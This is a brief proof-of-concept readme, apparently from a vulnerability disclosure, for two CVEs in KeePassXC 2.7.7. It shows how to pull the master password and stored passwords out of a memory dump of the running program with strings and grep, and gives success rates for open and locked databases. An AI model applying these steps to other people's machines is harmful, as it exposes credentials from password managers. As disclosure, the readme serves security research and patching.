POC: CVE-2024-33900, CVE-2024-33901

|  | 1. Get memory dump of KeePassXC (e.g. via Windows Taskmanager or virutalbox debugvm) |
| --- | --- |
|  | 2a. CVE-2024-33900 - get master password: string -e b <filename> | grep "YOUR MASTER PASSWORD" |
|  | 2b. CVE-2024-33901 - get stored password: string -e b <filename> | grep "YOUR STORED PASSWORD" |
|  |  |
|  | Note: Both attacks works every time when the database is open in KeePassXC. When the database is closed or locked the probability is 1 in 10 respectively 4 in 10. |
|  |  |
|  | Why does it work?: Don't really know :P But is the data is somewhere in the memory regions of the qt-framework as UTF-16 string. |
|  |  |
|  | This affects KeePassXC version 2.7.7. There is a high probablity, that other versions are also affected. |
